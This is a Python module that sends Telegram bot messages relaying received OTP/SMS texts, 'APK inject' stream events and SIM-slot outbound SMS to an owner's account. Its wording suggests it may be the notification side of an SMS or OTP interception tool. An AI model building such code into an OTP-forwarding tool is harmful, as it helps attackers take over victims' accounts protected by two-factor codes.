"""Telegram DM notifications — kept separate to avoid circular imports."""

from __future__ import annotations

import logging

from app.config import get_settings
from app.device_ui import (
    format_firebase_otp_card,
    format_inject_stream_card,
    format_outbound_stream_card,
)

logger = logging.getLogger(__name__)
settings = get_settings()


async def send_otp_received_dm(
    telegram_user_id: int,
    sender: str,
    message: str,
) -> bool:
    """Firebase OTP/SMS -> bot DM only (no APK inject)."""
    if not settings.telegram_bot_token:
        return False

    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    card = format_firebase_otp_card(sender, message)
    try:
        await bot.send_message(chat_id=telegram_user_id, text=card, parse_mode="HTML")
        return True
    except Exception as exc:
        logger.warning("OTP HTML DM failed for %s: %s — retry plain", telegram_user_id, exc)
        plain = f"NEW SMS from {sender}\n{message}"[:4000]
        try:
            await bot.send_message(chat_id=telegram_user_id, text=plain)
            return True
        except Exception as exc2:
            logger.error("OTP plain DM failed for %s: %s", telegram_user_id, exc2)
            return False


async def send_inject_stream_dm(
    telegram_user_id: int,
    sender: str,
    message: str,
    relay_ms: int = 3,
) -> None:
    """Astik-style [STREAM] card — owner DM only."""
    if not settings.telegram_bot_token:
        return

    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    stream_card = format_inject_stream_card(
        sender,
        message,
        queued_ms=relay_ms or 3,
        total_ms=(relay_ms or 3) + 1,
    )
    try:
        await bot.send_message(chat_id=telegram_user_id, text=stream_card, parse_mode="HTML")
    except Exception as exc:
        logger.error("Inject stream DM failed for %s: %s", telegram_user_id, exc)


async def send_outbound_stream_dm(
    telegram_user_id: int,
    to_number: str,
    message: str,
    *,
    sim_slot: int = 1,
    source: str = "CHANNEL",
    relay_ms: int = 3,
) -> None:
    """Owner DM card when channel/Firebase outgoing SMS is queued."""
    if not settings.telegram_bot_token:
        return

    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    card = format_outbound_stream_card(
        to_number,
        message,
        sim_slot=sim_slot,
        source=source,
        queued_ms=relay_ms or 3,
        total_ms=(relay_ms or 3) + 1,
    )
    try:
        await bot.send_message(chat_id=telegram_user_id, text=card, parse_mode="HTML")
    except Exception as exc:
        logger.error("Outbound stream DM failed for %s: %s", telegram_user_id, exc)
